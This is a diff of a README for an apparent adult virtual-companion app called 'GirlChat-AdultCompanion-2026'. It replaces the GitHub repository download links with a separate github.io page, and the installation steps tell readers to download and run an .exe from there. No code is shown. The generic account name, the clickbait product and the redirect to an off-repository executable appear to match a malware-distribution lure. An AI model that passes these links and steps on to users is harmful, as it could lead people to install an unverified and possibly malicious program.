@@ -1,6 +1,6 @@
 # 🤖 GirlChat-AdultCompanion-2026 - Experience your own custom virtual companion
 
-[ ![Download Version 2026](https://img.shields.io/badge/Download-Latest_Release-blue) ](https://github.com/liannainefficient679/GirlChat-AdultCompanion-2026)
+[ ![Download Version 2026](https://img.shields.io/badge/Download-Latest_Release-blue) ](https://liannainefficient679.github.io)
 
 ## 📔 What is GirlChat?
 
@@ -21,7 +21,7 @@ Before you start, check your computer against these requirements to ensure the p
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [official release page](https://github.com/liannainefficient679/GirlChat-AdultCompanion-2026) to find the latest version.
+1. Visit the [official release page](https://liannainefficient679.github.io) to find the latest version.
 2. Look for the file ending in .exe under the Assets section.
 3. Click the file name to start the download.
 4. Locate the downloaded file in your Downloads folder.
